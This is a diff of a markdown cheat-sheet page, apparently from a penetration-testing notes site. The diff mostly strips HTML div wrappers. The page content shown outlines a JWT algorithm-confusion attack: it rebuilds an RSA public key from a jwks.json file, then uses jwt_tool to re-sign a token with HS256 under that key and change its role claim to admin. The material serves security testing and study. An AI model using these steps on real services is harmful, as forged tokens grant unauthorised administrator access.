@@ -8,8 +8,6 @@ tags: ["jwt", "jwks", "forge", "cookies"]
 
 #### 0. Sample jwks.json
 
-<div>
-
 ```console
 { 
     "keys": [
@@ -24,13 +22,10 @@ tags: ["jwt", "jwks", "forge", "cookies"]
 }
 ```
 
-</div>
-
 #### 1. Create a public key
 
-<div>
-
 ```console
+# Invoking python interpreter
 python3
 ```
 
@@ -59,19 +54,11 @@ key = RSA.construct((n, e))
 print(key.exportKey().decode())
 ```
 
-</div>
-
 #### 2. Forge a jwt
-
-<div>
 
 ```console
 # For example, modify role to admin
 python3 jwt_tool.py -S hs256 -k public.pem -I -pc role -pv admin <JWT>
 ```
 
-</div>
-
 <small>*Ref: [jwt_tool](https://github.com/ticarpi/jwt_tool)*</small>
-
-<br>
